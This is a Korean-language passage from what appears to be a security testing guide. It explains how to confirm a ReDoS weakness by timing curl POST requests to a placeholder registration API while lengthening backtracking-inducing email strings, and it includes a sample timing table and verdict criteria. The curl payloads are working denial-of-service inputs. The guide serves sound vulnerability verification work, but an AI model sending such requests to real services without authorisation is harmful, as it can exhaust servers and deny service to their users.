### Phase 2: 동적 테스트 (검증)


**Step 1: 기준선 측정 (필수)**

정상 요청의 응답 시간을 3회 측정하여 기준선을 확립한다:
```
# 기준선 측정 (정상 입력)
curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
  -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"normal@test.com"}'
# 3회 반복하여 평균 기준선 확인
```

**Step 2: 점진적 길이 증가 테스트**

Phase 1에서 식별한 취약 정규식에 맞는 역추적 유발 문자열을 구성한다:
- 정규식의 반복 그룹에 매치하는 문자를 반복 + 마지막에 불일치 문자 추가

```
# 길이 10자 — 기준선과 유사해야 함
curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
  -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaa!"}'

# 길이 15자
curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
  -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaa!"}'

# 길이 20자
curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
  -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaa!"}'

# 길이 25자
curl -w "\ntime_total: %{time_total}\n" -o /dev/null -s \
  -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaa!"}'

# 길이 30자 (25자에서 지연이 보이면)
curl -w "\ntime_total: %{time_total}\n" -m 30 -o /dev/null -s \
  -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'
```

**Step 3: 결과 분석**

측정된 응답 시간을 테이블로 정리한다:

```
| 입력 길이 | 시도 1 | 시도 2 | 시도 3 | 평균 |
|-----------|--------|--------|--------|------|
| 기준선    | 0.05s  | 0.04s  | 0.05s  | 0.047s |
| 10자      | 0.05s  | 0.05s  | 0.06s  | 0.053s |
| 15자      | 0.06s  | 0.07s  | 0.06s  | 0.063s |
| 20자      | 0.15s  | 0.14s  | 0.16s  | 0.150s |
| 25자      | 3.2s   | 3.5s   | 3.1s   | 3.267s |  ← 지수적 증가 시작
| 30자      | 60s+   | ...    | ...    | timeout |
```

**판정 기준:**

| 패턴 | 판단 |
|------|------|
| 길이 5자 증가마다 응답 시간이 2배 이상 증가 (지수적) | 확인됨 |
| 25자 이하에서 3초+ 지연 (기준선 대비) | 확인됨 |
| 모든 길이에서 응답 시간 유사 (선형적 또는 변화 없음) | 안전 |
| 입력 검증 에러로 조기 반환 (길이 무관) | 안전 (입력 검증이 정규식 전에 동작) |
| 30자에서만 약간 지연 (1초 미만) | 후보 (실제 DoS 영향은 제한적) |

**타임아웃 설정:**
- 30자 이상 테스트에는 `-m 30` (30초 타임아웃) 설정
- 타임아웃 발생 시 ReDoS 확인됨으로 판정

**검증 기준:**
- **확인됨**: 동적 테스트로 입력 길이 증가에 따라 응답 시간이 지수적으로 증가하는 것을 직접 확인함 (예: 20자 → 0.1초, 25자 → 3초, 30자 → 60초+)
